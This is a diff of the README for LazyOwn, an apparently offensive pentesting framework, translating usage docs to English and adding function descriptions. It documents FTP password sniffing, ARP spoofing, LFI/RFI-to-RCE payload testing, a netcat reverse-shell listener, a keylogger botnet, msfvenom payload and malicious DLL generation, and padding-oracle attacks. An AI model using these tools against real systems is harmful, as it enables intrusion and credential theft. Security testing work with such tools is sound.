+Visit Groq Console (https://console.groq.com/docs/quickstart) to register and obtain an API key.
 ```sh
 export GROQ_API_KEY=<tu_api_key>
 python3 lazygptcli.py --prompt "<tu prompt>" [--debug]          
@@ -700,40 +467,42 @@ python3 lazygptcli.py --prompt "<tu prompt>" [--debug]
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/90a95c2a-48d3-4b02-8055-67656c1e71c9)
 
-## Uso de modo lazyown_bprfuzzer.py
+## Usage of lazyown_bprfuzzer.py
 
-Proporcionar los argumentos según las solicitudes del script: El script solicitará los siguientes argumentos:
+Provide the arguments as specified by the script's requests: The script will require the following arguments:
+
+
+
 usage: lazyown_bprfuzzer.py [-h] --url URL [--method METHOD] [--headers HEADERS] [--params PARAMS] [--data DATA] [--json_data JSON_DATA]
                    [--proxy_port PROXY_PORT] [-w WORDLIST] [-hc HIDE_CODE]
-
-lazyburp.py: error: the following arguments are required: --url
---url: La URL a la que se enviará la solicitud (obligatorio).
---method: El método HTTP a utilizar, como GET o POST (opcional, valor predeterminado: GET).
---headers: Los encabezados de la solicitud en formato JSON (opcional, valor predeterminado: {}).
---params: Los parámetros de la URL en formato JSON (opcional, valor predeterminado: {}).
---data: Los datos del formulario en formato JSON (opcional, valor predeterminado: {}).
---json_data: Los datos JSON para la solicitud en formato JSON (opcional, valor predeterminado: {}).
---proxy_port: El puerto del proxy interno (opcional, valor predeterminado: 8080).
--w, --wordlist: La ruta del diccionario para el modo de fuzzing (opcional).
--hc, --hide_code: El código de estado HTTP para ocultar en la salida (opcional).
-
+--url: The URL to which the request will be sent (required).
+--method: The HTTP method to use, such as GET or POST (optional, default: GET).
+--headers: The request headers in JSON format (optional, default: {}).
+--params: The URL parameters in JSON format (optional, default: {}).
+--data: The form data in JSON format (optional, default: {}).
+--json_data: The JSON data for the request in JSON format (optional, default: {}).
+--proxy_port: The port for the internal proxy (optional, default: 8080).
+-w, --wordlist: The path to the wordlist for fuzzing mode (optional).
+-hc, --hide_code: The HTTP status code to hide in the output (optional).
+Make sure to provide the required arguments to ensure the script runs correctly.
 ```sh
 python3 lazyown_bprfuzzer.py --url "http://example.com" --method POST --headers '{"Content-Type": "LAZYFUZZ"}'
 ```
 
-Forma 2: Uso Avanzado
-Si deseas aprovechar las características avanzadas del script, como el modo de repetición o fuzzing, sigue estos pasos:
+Form 2: Advanced Usage
 
-Repetición de solicitudes:
+If you wish to take advantage of the advanced features of the script, such as request replay or fuzzing, follow these steps:
 
-Para utilizar la funcionalidad de repetición de solicitudes, proporciona los argumentos como se indicó anteriormente.
-Durante la ejecución, el script preguntará si deseas repetir la solicitud. Ingresa 's' para repetir o 'n' para finalizar el repetidor.
+Request Replay:
+
+To utilize the request replay functionality, provide the arguments as indicated earlier.
+During execution, the script will ask if you want to repeat the request. Enter 'y' to repeat or 'n' to terminate the repeater.
 Fuzzing:
 
-Para usar la funcionalidad de fuzzing, asegúrate de proporcionar un diccionario de palabras con el argumento -w o --wordlist.
-El script reemplazará la palabra LAZYFUZZ en la URL y otros datos con las palabras del diccionario proporcionado.
-Durante la ejecución, el script mostrará los resultados de cada iteración de fuzzing.
-Estas son las formas básicas y avanzadas de usar el script lazyburp.py. Dependiendo de tus necesidades, puedes elegir la forma que mejor se adapte a tu situación específica.
+To use the fuzzing functionality, make sure to provide a wordlist with the -w or --wordlist argument.
+The script will replace the word LAZYFUZZ in the URL and other data with the words from the provided wordlist.
+During execution, the script will display the results of each fuzzing iteration.
+These are the basic and advanced ways to use the lazyburp.py script. Depending on your needs, you can choose the method that best fits your specific situation.
 
 ```sh
 python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
@@ -762,17 +531,18 @@ python3 lazyown_bprfuzzer.py \                                                  
 ```
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/dc66fdc2-cd7d-4b79-92c6-dd43d376ee0e)
-PD: para usar el diccionario que utilizo realizar dentro de /usr/share/seclist el siguiente comando
+Note: To use the dictionary, run the following command within /usr/share/seclists:
 
 ```sh
+now the command 'getseclist' do that automated.
 wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
 && unzip SecList.zip \
 && rm -f SecList.zip
 ```
 
-## Uso modo LazyOwn FTP Sniff
+## Usage of LazyOwn FTP Sniff Mode
 
-este modulo sirve para buscar claves en la red de servidores ftp, algunos me dirán que no se ya no se usa pero se sorprenderian en los entornos productivos en infraestructura critica que e visto maquinas con FTP's masivos corriendo en sus servidores :)
+This module is used to search for passwords on FTP servers across the network. Some may say that FTP is no longer used, but you would be surprised at the critical infrastructure environments I've seen with massive FTP services running on their servers. :)
 
 ```sh
 set device eth0
@@ -783,7 +553,7 @@ run lazyftpsniff
 
 ## Uso modo LazyReverseShell
 
-primero nos ponemos en escucha con el comando
+Listen
 
 ```sh
 nc -nlvp 1337 #o el puerto que escojamos 
@@ -799,57 +569,57 @@ para luego en la maquina victima
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190)
 
-## Uso modo Lazy Curl to recon
+## Usage of Lazy Curl to Recon Mode
 
-el modulo está en modules y se usa así:
+The module is located in the modules directory and is used as follows:
 
 ```sh
 chmod +x lazycurl.sh
 ```
 
-Ejecutar el script con los parámetros deseados. Por ejemplo:
+and then
 
 ```sh
 ./lazycurl.sh --mode GET --url http://10.10.10.10
 ```
 
-Ejemplos de uso
+Usage.
 
-Enviar una solicitud GET:
+GET:
 
 ```sh
 ./lazycurl.sh --mode GET --url http://10.10.10.10
 ```
 
-Enviar una solicitud POST:
+POST:
 
 ```sh
 ./lazycurl.sh --mode POST --url http://10.10.10.10 --data "param1=value1&param2=value2"
 ```
 
-Probar un método TRACE:
+TRACE:
 
 ```sh
 ./lazycurl.sh --mode TRACE --url http://10.10.10.10
 ```sh
 
-Subir un archivo:
+File upload:
 
 ```sh
 ./lazycurl.sh --mode UPLOAD --url http://10.10.10.10 --file file.txt
 ```
 
-Realizar fuerza bruta con una wordlist:
+wordlist bruteforce mode:
 
 ```sh
 ./lazycurl.sh --mode BRUTE_FORCE --url http://10.10.10.10 --wordlist /usr/share/wordlists/rockyou.txt
 ```
 
-Asegúrate de ajustar los parámetros según tus necesidades y de que los valores que pases a las opciones sean válidos para cada caso.
+Make sure to adjust the parameters according to your needs and that the values you provide for the options are valid for each case.
 
-## Uso modo ARPSpoofing
+## Usage of ARPSpoofing Mode
 
-el script provee de un ataque de ARPSpoofing mediante scapy en el payload debe ser seteado el lhost rhost y el device que pondràs a arpspoofear
+The script provides an ARP spoofing attack using Scapy. In the payload, you must set the lhost, rhost, and the device that you will use to perform the ARP spoofing.
 
 ```sh
 set rhost 192.168.1.100
@@ -858,9 +628,9 @@ set device eth0
 run lazyarpspoofing
 ```
 
-## Uso modo LazyGathering
+## Usage of LazyGathering Mode
 
-script que nos provee una visión de rayos x en cuanto al sistema en cuestion donde estamos ejecutando la herramiente
+This script provides an X-ray view of the system in question where the tool is being executed, offering insights into its configuration and state.
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/6d1416f9-10cd-4316-8a62-92c3f10082e0)
 
@@ -868,9 +638,9 @@ script que nos provee una visión de rayos x en cuanto al sistema en cuestion do
 run lazygath
 ```
 
-## Uso modo Lazy Own Lfi Rfi 2 Rce
+## Usage of Lazy Own LFI RFI 2 RCE Mode
 
-El modo Lfi Rfi 2 Rce es par aprobar algunos payloads más conocidos a los parametros de payload.json
+The LFI RFI 2 RCE mode is designed to test some of the more well-known payloads against the parameters specified in payload.json. This allows for a comprehensive assessment of Local File Inclusion (LFI), Remote File Inclusion (RFI), and Remote Code Execution (RCE) vulnerabilities in the target system.
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/4259a469-8c8e-4d11-8db5-39a3bf15059c)
 
@@ -879,151 +649,143 @@ payload
 run lazylfi2rce
 ```
 
-## Uso modo LazyOwn Sniffer
+
+
+
+
+### Usage of LazyOwn Sniffer Mode
 
 <https://www.youtube.com/watch?v=_-DDiiMrIlE>
 
-El modo sniffer nos permite capturar el trafico de red por interfaces con la opcion -i que es la opción obligatoria, dentro de muchas tras opciones no obligatorias,
+The sniffer mode allows capturing network traffic through interfaces using the `-i` option, which is mandatory. There are many other optional settings that can be adjusted as needed.
+
+#### Usage
+```bash
 usage: lazysniff.py [-h] -i INTERFACE [-c COUNT] [-f FILTER] [-p PCAP]
 lazysniff.py: error: the following arguments are required: -i/--interface
 
+
 ![Captura de pantalla 2024-06-05 031231](https://github.com/grisuno/LazyOwn/assets/1097185/db1e05a0-026e-414f-9ec6-0a9ef2cb06fe)
 
-usando desde el framework se debe setear device con set device [eth0, wla0,eth1, wlan1, etc] segun sea su interface y luego:
+To use the sniffer from the framework, you must configure the device with the command:
 
 ```sh
 run lazysniff
+or just
+sniff
 ```
 
-## Uso modo LazyAtack
+### Experimental Obfuscation Using PyInstaller
 
-Este script de pentesting en Bash permite ejecutar una serie de pruebas de seguridad en modo servidor (máquina víctima) o en modo cliente (máquina atacante). Dependiendo del modo seleccionado, ofrece diferentes opciones y funcionalidades para llevar a cabo diversas acciones de prueba de penetración.
+This feature is in experimental mode and does not work fully due to a path issue. Soon, it will support obfuscation using PyInstaller.
 
-Opciones del Script
-Modo Servidor:
-
-Ejecuta en la máquina víctima.
-Ofrece opciones como iniciar un servidor HTTP, configurar netcat para escuchar conexiones, enviar archivos mediante netcat, configurar una shell reversa, entre otros.
-Modo Cliente:
-
-Ejecuta en la máquina atacante.
-Ofrece opciones como descargar listas de SecLists, escanear puertos, enumerar servicios HTTP, verificar conectividad, monitorear procesos, ejecutar ataques LFI, entre otros.
-Ejemplos de Uso
-Uso Básico
-
-```sh
-./lazyatack.sh --modo servidor --ip 192.168.1.1 --atacante 192.168.1.100
-```
-
-```sh
-./lazyatack.sh --modo cliente --url http://victima.com --ip 192.168.1.10
-```
-
-Esto ejecuta el script en modo cliente, configurando la URL de la víctima como <http://victima.com> y la IP de la víctima como 192.168.1.10.
-
-## Funciones del Script
-
-```
-Funciones del Script
-Descargar SecLists: Descarga y extrae las listas de SecLists para su uso.
-Escanear Puertos: Ejecuta un escaneo completo de puertos usando nmap.
-Escanear Puertos Específicos: Escanea puertos específicos (22, 80, 443).
-Enumerar Servicios HTTP: Enumera servicios HTTP en la URL víctima.
-Iniciar Servidor HTTP: Inicia un servidor HTTP en el puerto 80.
-Configurar Netcat: Configura netcat para escuchar en el puerto 443.
-Enviar Archivo Mediante Netcat: Envía un archivo a una escucha netcat.
-Verificar Conectividad: Verifica la conectividad mediante ping y tcpdump.
-Verificar Conectividad con Curl: Verifica la conectividad usando curl.
-Configurar Shell Reversa: Configura una shell reversa.
-Escuchar Shell con Netcat: Escucha una shell con netcat.
-Monitorear Procesos: Monitorea los procesos en ejecución.
-Ejecutar Wfuzz: Ejecuta un ataque de enumeración de directorios web con wfuzz.
-Comprobar Permisos Sudo: Comprueba los permisos de sudo.
-Explotar LFI: Explota una vulnerabilidad de inclusión de archivos locales.
-Configurar TTY: Configura TTY para una sesión shell más estable.
-Eliminar Archivos de Forma Segura: Elimina archivos de forma segura.
-Obtener Root Shell mediante Docker: Obtiene una root shell mediante Docker.
-Enumerar Archivos con SUID: Enumera archivos con permisos SUID.
-Listar Timers de Systemd: Lista timers de systemd.
-Comprobar Rutas de Comandos: Comprueba rutas de comandos.
-Abusar de Tar: Abusa de tar para ejecutar una shell.
-Enumerar Puertos Abiertos: Enumera puertos abiertos.
-Eliminar Contenedores Docker: Elimina todos los contenedores Docker.
-Escanear Red: Escanea la red con secuencia y xargs.
-```
-
-## Experimental LazyOwnWebShell en python
-
-Corre en <http://localhost:5000> experimental, ya que aun no funciona la salida de la webshell de cara al navegador. pero los comandos si son ejecutados correctamente. por eso está en modo experimental... por no decir que aun tiene bugs xD
-
-![Captura de pantalla 2024-06-09 030335](https://github.com/grisuno/LazyOwn/assets/1097185/4bc6e25a-5c69-4dbc-a1b1-a3c455b38bfd)
-
-```sh
-python3 main.py 
-```
-
-## Experimental ofuscación mediante pyinstaller
-
-esto está en modo experimental y no funciona del todo, ya que tiene un problema de rutas. pronto ya contará con ofuscación mediante pyinstaller
 
 ```sh
 ./py2el.sh
 ```
 
-## Experimental exploit netbios
+## Experimental NetBIOS Exploit
 
-esto está en modo experimental ya que aun no funciona... (proximamente quizas una implementacion de eternalblue entre otras cositas...)
+This feature is in experimental mode as it is not functioning yet... (coming soon, possibly an implementation of EternalBlue among other things...)
+
 
 ```sh
 run lazynetbios
 ```
 
-## Experimental LazyBotNet con keylogger para windows y Linux
+## Experimental LazyBotNet with Keylogger for Windows and Linux
 
-esto está en modo experimental y no funciona la desencriptación del log del keylogger xD
-acá vemos por primera vez en accion el comando payload el cual nos setea toda la config en nuestro payload.json así podemos precargar la config antes de arrancar con el framework
+This feature is in experimental mode, and the decryption of the keylogger logs is not functioning xD. Here we see for the first time in action the `payload` command, which sets all the configuration in our `payload.json`, allowing us to preload the configuration before starting the framework.
+
 
 ```sh
 payload
 run lazybotnet
 ```
 
-## Menús Interactivos
+## Interactive Menus
 
-El script presenta menús interactivos para seleccionar las acciones a realizar. En modo servidor, muestra opciones relevantes para la máquina víctima, y en modo cliente, muestra opciones relevantes para la máquina atacante.
+The script features interactive menus to select actions to be performed. In server mode, it displays relevant options for the victim machine, while in client mode, it shows options relevant to the attacking machine.
 
-Interrupción Limpia
-El script maneja la señal SIGINT (usualmente generada por Control + C) para salir limpiamente.
+### Clean Interruption
 
-## Licencia
+The script handles the SIGINT signal (usually generated by Control + C) to exit cleanly.
 
-Este proyecto está licenciado bajo la Licencia GPL v3. La información contenida en GTFOBins es propiedad de sus autores, a quienes se les agradece enormemente por la información proporcionada.
+## License
 
-## Agradecimientos ✌
+This project is licensed under the GPL v3 License. The information contained in GTFOBins is owned by its authors, to whom we are immensely grateful for the information provided.
 
-Un agradecimiento especial a  [GTFOBins](https://gtfobins.github.io/) por la valiosa información que proporcionan y a ti por utilizar este proyecto. Tambien ¡Gracias por tu apoyo Tito S4vitar! quien hace una tarea extraordinarìa de divulgaciòn. por supuesto que utilizo la funcion extractPorts en mi .zshrc :D
+## Acknowledgments ✌
 
-### Agradecimientos a pwntomate 🍅
+A special thanks to [GTFOBins](https://gtfobins.github.io/) for the valuable information they provide and to you for using this project. Also, thanks for your support Tito S4vitar! who does an extraordinary job of outreach. Of course, I use the `extractPorts` function in my `.zshrc` :D
 
-una excelente herramienta que adapte un poco para que funcione con el proyecto todos los creditos son de su autor honze-net Andreas Hontzia visiten y denle amor al proyecto <https://github.com/honze-net/pwntomate>
+### Thanks to pwntomate 🍅
 
-### Agradecimientos a Sicat 🐈
-una exelente t00l para detección de cvs, implementé solo la busqueda por keyword ya que tuve que cambiar un poco las librerias, pronto tambien para xml generado por nmap :) gracias totales justakazh.
-https://github.com/justakazh/sicat/
+An excellent tool that I adapted a bit to work with the project; all credits go to its author honze-net Andreas Hontzia. Visit and show love to the project: <https://github.com/honze-net/pwntomate>
+
+### Thanks to Sicat 🐈
+
+An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. <https://github.com/justakazh/sicat/>
 
 ## Abstract
 
-LazyOwn es un marco de trabajo que agiliza el flujo del mismo y automatiza muchas tareas y pruebas mediante alias y distintas herramientas es como una navaja multiproposito con navajas multipropisitos para el hacking xD
+LazyOwn is a framework that streamlines its workflow and automates many tasks and tests through aliases and various tools, functioning like a Swiss army knife with multipurpose blades for hacking xD.
 
 # Documentation by readmeneitor.py
 
-Documentación creada automaticamente por el script readmeneitor.py creado para este proyecto, quizas algún día tenga su propio repo por ahora no lo veo necesario.
+Documentation automatically created by the script `readmeneitor.py` created for this project; maybe one day it will have its own repo, but for now, I don't see it as necessary.
 
 <!-- START UTILS -->
 # UTILS.md Documentation  by readmeneitor.py
 
+## parse_ip_mac
+Extracts IP and MAC addresses from a formatted input string using a regular expression.
+
+The input string is expected to be in the format: 'IP: (192.168.1.222) MAC: ec:c3:02:b0:4c:96'.
+The function uses a regular expression to match and extract the IP address and MAC address from the input.
+
+Args:
+    input_string (str): The formatted string containing the IP and MAC addresses.
+
+Returns:
+    tuple: A tuple containing the extracted IP address and MAC address. If the format is incorrect, returns (None, None).
+
+## create_arp_packet
+Constructs an ARP packet with the given source and destination IP and MAC addresses.
+
+The function creates both Ethernet and ARP headers, combining them into a complete ARP packet.
+
+Args:
+    src_mac (str): Source MAC address in the format 'xx:xx:xx:xx:xx:xx'.
+    src_ip (str): Source IP address in dotted decimal format (e.g., '192.168.1.1').
+    dst_ip (str): Destination IP address in dotted decimal format (e.g., '192.168.1.2').
+    dst_mac (str): Destination MAC address in the format 'xx:xx:xx:xx:xx:xx'.
+
+Returns:
+    bytes: The constructed ARP packet containing the Ethernet and ARP headers.
+
+## send_packet
+Sends a raw ARP packet over the specified network interface.
+
+The function creates a raw socket, binds it to the specified network interface, and sends the given packet.
+
+Args:
+    packet (bytes): The ARP packet to be sent.
+    iface (str): The name of the network interface to use for sending the packet (e.g., 'eth0').
+
+Raises:
+    OSError: If an error occurs while creating the socket or sending the packet.
+
 ## load_version
-No description available.
+Load the version number from the 'version.json' file.
+
+This function attempts to open the 'version.json' file and load its contents. 
+If the file is found, it retrieves the version number from the JSON data. 
+If the version key does not exist, it returns a default version 'release/v0.0.14'. 
+If the file is not found, it also returns the default version.
+
+Returns:
+- str: The version number from the file or the default version if the file is not found or the version key is missing.
 
 ## print_error
 Prints an error message to the console.
@@ -1269,22 +1031,180 @@ Raises:
     Exception: Para otros errores que puedan ocurrir.
 
 ## exploitalert
-No description available.
+Process and display results from ExploitAlert.
+
+This function checks if the provided content contains any results. 
+If results are present, it prints the title and link for each exploit found, 
+and appends the results to a predata list. If no results are found, 
+it prints an error message.
+
+Parameters:
+- content (list): A list of dictionaries containing exploit information.
+
+Returns:
+None
+Thanks to Sicat 🐈
+An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
 
 ## packetstormsecurity
-No description available.
+Process and display results from PacketStorm Security.
+
+This function extracts exploit data from the provided content using regex. 
+If any results are found, it prints the title and link for each exploit, 
+and appends the results to a predata list. If no results are found, 
+it prints an error message.
+
+Parameters:
+- content (str): The HTML content from PacketStorm Security.
+
+Returns:
+None
+Thanks to Sicat 🐈
+An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
 
 ## nvddb
-No description available.
+Process and display results from the National Vulnerability Database.
+
+This function checks if there are any vulnerabilities in the provided content. 
+If vulnerabilities are present, it prints the ID, description, and link 
+for each CVE found, and appends the results to a predata list. 
+If no results are found, it prints an error message.
+
+Parameters:
+- content (dict): A dictionary containing vulnerability data.
+
+Returns:
+None
+Thanks to Sicat 🐈
+An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
 
 ## find_ss
-No description available.
+Find CVEs in the National Vulnerability Database based on a keyword.
+
+This function takes a keyword, formats it for the API request, 
+and sends a GET request to the NVD API. If the request is successful, 
+it returns the JSON response containing CVE data; otherwise, 
+it returns False.
+
+Parameters:
+- keyword (str): The keyword to search for in CVEs.
+
+Returns:
+- dict or bool: The JSON response containing CVE data or False on failure.
+Thanks to Sicat 🐈
+An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
 
 ## find_ea
-No description available.
+Find exploits in ExploitAlert based on a keyword.
+
+This function takes a keyword, formats it for the API request, 
+and sends a GET request to the ExploitAlert API. If the request is successful, 
+it returns the JSON response containing exploit data; otherwise, 
+it returns False.
+
+Parameters:
+- keyword (str): The keyword to search for exploits.
+
+Returns:
+- dict or bool: The JSON response containing exploit data or False on failure.
+Thanks to Sicat 🐈
+An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
 
 ## find_ps
-No description available.
+Find exploits in PacketStorm Security based on a keyword.
+
+This function takes a keyword, formats it for the search request, 
+and sends a GET request to the PacketStorm Security website. 
+If the request is successful, it returns the HTML response; otherwise, 
+it returns False.
+
+Parameters:
+- keyword (str): The keyword to search for exploits.
+
+Returns:
+- str or bool: The HTML response containing exploit data or False on failure.
+Thanks to Sicat 🐈
+An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
+
+## xor_encrypt_decrypt
+Encrypts or decrypts data using XOR encryption with the provided key.
+
+Parameters:
+data (bytes or bytearray): The input data to be encrypted or decrypted.
+key (str): The encryption key as a string.
+
+Returns:
+bytearray: The result of the XOR operation, which can be either the encrypted or decrypted data.
+
+Example:
+encrypted_data = xor_encrypt_decrypt(b"Hello, World!", "key")
+decrypted_data = xor_encrypt_decrypt(encrypted_data, "key")
+print(decrypted_data.decode("utf-8"))  # Outputs: Hello, World!
+
+Additional Notes:
+- XOR encryption is symmetric, meaning that the same function is used for both encryption and decryption.
+- The key is repeated cyclically to match the length of the data if necessary.
+- This method is commonly used for simple encryption tasks, but it is not secure for protecting sensitive information.
+
+## run
+Executes a shell command using the subprocess module, capturing its output.
+
+Parameters:
+command (str): The command to execute.
+
+Returns:
+str: The output of the command if successful, or an error message if an exception occurs.
+
+Exceptions:
+- FileNotFoundError: Raised if the command is not found.
+- subprocess.CalledProcessError: Raised if the command exits with a non-zero status.
+- subprocess.TimeoutExpired: Raised if the command times out.
+- Exception: Catches any other unexpected exceptions.
+
+Example:
+output = run("ls -la")
+print(output)
+
+Additional Notes:
+The function attempts to execute the provided command, capturing its output.
+It also handles common exceptions that may occur during command execution.
+
+## is_exist
+Check if a file exists.
+
+This function checks whether a given file exists on the filesystem. If the file 
+does not exist, it prints an error message and returns False. Otherwise, it returns True.
+
+Arguments:
+file (str): The path to the file that needs to be checked.
+
+Returns:
+bool: Returns True if the file exists, False otherwise.
+
+Example:
+>>> is_exist('/path/to/file.txt')
+True
+>>> is_exist('/non/existent/file.txt')
+False
+
+Notes:
+This function uses os.path.isfile to determine the existence of the file. 
+Ensure that the provided path is correct and accessible.
+
+## get_domain
+Extracts the domain from a given URL.
+
+Parameters:
+url (str): The full URL from which to extract the domain.
+
+Returns:
+str: The extracted domain from the URL, or None if it cannot be extracted.
+
+## generate_certificates
+Generates a certificate authority (CA), client certificate, and client key.
+
+Returns:
+    str: Paths to the generated CA certificate, client certificate, and client key.
 
 ## wrapper
 internal wrapper of internal function to implement multiples rhost to operate. 
@@ -1293,9 +1213,6 @@ internal wrapper of internal function to implement multiples rhost to operate.
 
 <!-- START COMMANDS -->
 # COMMANDS.md Documentation  by readmeneitor.py
-
-## xor_encrypt_decrypt
-XOR Encrypt or Decrypt data with a given key
 
 ## __init__
 Initializer for the LazyOwnShell class.
@@ -2367,12 +2284,15 @@ Note:
     - Parameters must be set before calling this function.
 
 ## lazymsfvenom
-Runs the `msfvenom` tool to generate payloads based on user input.
+Executes the `msfvenom` tool to generate a variety of payloads based on user input.
 
-Prompts the user to select a payload type from a list and executes the corresponding
-`msfvenom` command to generate a payload. Moves the generated payloads to a `sessions`
-directory and sets appropriate permissions. Optionally compresses the payloads using UPX
-and handles a C payload with shikata_ga_nai.
+This function prompts the user to select a payload type from a predefined list and runs the corresponding
+`msfvenom` command to create the desired payload. It handles tasks such as generating different types of
+payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.
+
+The generated payloads are moved to a `sessions` directory, where appropriate permissions are set. Additionally,
+the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
+the function will also sign the APK and perform necessary post-processing steps.
 
 :param line: Command line arguments for the script.
 :return: None
@@ -2482,20 +2402,20 @@ Note:
     - Ensure proper exception handling to manage process interruptions.
 
 ## payload
-Load parameters from payload.json
+Load parameters from a specified payload JSON file.
 
-This function loads parameters from a JSON file named `payload.json` and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.
+This function loads parameters from a JSON file specified by the `line` argument and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.
 
 Usage:
-    payload
+    payload <filename>
 
-:param line: This parameter is not used in this function.
+:param line: The name of the JSON file to load.
 :type line: str
 
 :returns: None
 
 Manual execution:
-1. Open and read the `payload.json` file.
+1. Open and read the specified JSON file.
 2. Update the `params` dictionary with values from the JSON file.
 3. Print a success message if the parameters were successfully loaded.
 4. Handle `FileNotFoundError` if the file does not exist.
@@ -2505,10 +2425,10 @@ Dependencies:
 - `json` module for reading and parsing the JSON file.
 
 Example:
-    To execute the function, simply call `payload`.
+    To execute the function, call `payload payload_10.10.10.10.json`.
 
 Note:
-    - Ensure that `payload.json` exists in the current directory and is properly formatted.
+    - Ensure that the specified JSON file exists in the current directory and is properly formatted.
     - The confirmation message includes color formatting for better visibility.
 
 ## exit
@@ -2882,6 +2802,7 @@ Replace `<target_ip>` with the IP address of the target system. For example:
 Runs the `nikto` tool to perform a web server vulnerability scan against the specified target host.
 
 1. Executes `nikto` with the `-h` option to specify the target host IP address.
+2. Installs `nikto` if it is not already installed.
 
 :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
 :param rhost: The IP address of the target web server, specified in the `params` dictionary.
@@ -3736,6 +3657,34 @@ Example:
 Note:
     Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the clipboard will not be updated.
 
+## ipp
+Displays IP addresses of network interfaces and prints the IP address from the `tun0` interface.
+
+This function performs the following tasks:
+1. Displays IP addresses for all network interfaces using `ip a show scope global` and `awk`.
+2. Prints the IP address from the `tun0` interface.
+
+Usage:
+    ip
+
+:param line: This parameter is not used in the function but is included for consistency with other command methods.
+:type line: str
+:returns: None
+
+Manual execution:
+1. The command `ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [[96m" iface"[0m] "a[1] }'` is executed to display the IP addresses of all network interfaces.
+2. The IP address of the `tun0` interface is printed to the console using the command `ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1`.
+
+Dependencies:
+- The function relies on `awk`, `grep`, `cut`, and `xclip` to process and display the IP address.
+
+Example:
+    ip
+    # This will display IP addresses for all network interfaces and print the IP address from `tun0`.
+
+Note:
+    Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the address will not be displayed.
+
 ## rhost
 Copies the remote host (rhost) to the clipboard and updates the command prompt.
 
@@ -3771,6 +3720,38 @@ Example:
 
 Note:
     Ensure that the `rhost` is valid by checking it with the `check_rhost` function before copying it to the clipboard.
+
+## rrhost
+Updates the command prompt to include the remote host (rhost) and current working directory.
+
+This function performs two tasks:
+1. It updates the command prompt to include the `rhost` and the current working directory if `line` is not 'clean'.
+2. It resets the command prompt to its default format if `line` is 'clean'.
+
+Usage:
+    rhost [clean]
+
+:param line: An optional argument that determines the behavior of the function:
+    - If 'clean', it resets the command prompt to its default format.
+    - If any other value, it updates the command prompt to include the `rhost` and current working directory.
+:type line: str
+:returns: None
+
+Manual execution:
+1. If `line` is 'clean':
+- The command prompt is reset to its default format.
+2. If `line` is any other value:
+- The command prompt is updated to show the `rhost` and the current working directory.
+
+Example:
+    rhost
+    # This will update the command prompt to include the `rhost` and current working directory.
+    
+    rhost clean
+    # This will reset the command prompt to its default format.
+
+Note:
+    Ensure that the `rhost` is valid by checking it with the `check_rhost` function before updating the prompt.
 
 ## banner
 Show the banner
@@ -5458,23 +5439,24 @@ Note:
 - The wordlist used by Skipfish is specified in `wordlist`.
 
 ## createdll
-Create a Windows DLL file using MinGW-w64.
+Create a Windows DLL file using MinGW-w64 or a Blazor DLL for Linux.
 
-This function prompts the user to select between creating a 32-bit 
-or 64-bit DLL. It checks if MinGW-w64 is installed, and if not, 
-it installs it. The user must provide a filename for the DLL, 
-which will be created from the `sessions/rev.c` source file. 
-The function constructs the appropriate command to compile 
-the DLL based on the user's choice and executes it. 
-It also opens the `rev.c` file in a text editor for any modifications 
-before compilation.
+This function prompts the user to select between creating a 32-bit DLL, 
+a 64-bit DLL, or a Linux Blazor DLL. It first checks if MinGW-w64 is installed; 
+if not, it attempts to install it. The user must provide a filename for the 
+DLL, which will be created from the `sessions/rev.c` source file. 
+The function constructs the appropriate command to compile the DLL based on 
+the user's choice and executes it. If the user selects a 32-bit or 64-bit 
+compilation, the function also opens the `rev.c` file in a text editor for 
+modifications before compilation. For option 3, it executes a script to create 
+a Blazor DLL using the local host (lhost) address to download the necessary payload.
 
 Parameters:
-- line (str): The name of the DLL file to be created. 
+- line (str): The name of the DLL file to be created.
             Must be provided by the user.
 
 Usage:
-- Choose "1" for 32-bit or "2" for 64-bit compilation.
+- Choose "1" for 32-bit, "2" for 64-bit, or "3" for creating a Linux Blazor DLL.
 - Ensure that shellcode is created beforehand using 
 the `lazymsfvenom` or `venom` options 13 or 14 
 to replace in `sessions/rev.c`.
@@ -5497,6 +5479,889 @@ Replace `<target_host>` with the URL or IP address of the web application you wa
 
 For example:
     lazyseo.py example.com
+
+## padbuster
+Execute the PadBuster command for padding oracle attacks.
+
+This function constructs and executes a PadBuster command to perform
+a padding oracle attack on the specified URL. It requires the user
+to provide a URL, a cookie with a hash, a plaintext value to compare, 
+and a specific byte position to attack.
+
+Parameters:
+- line (str): The input line containing the cookie, plaintext, and byte 
+            position. Expected format: 'cookie=<HASH> plaintext <byte_position>'.
+
+Functionality:
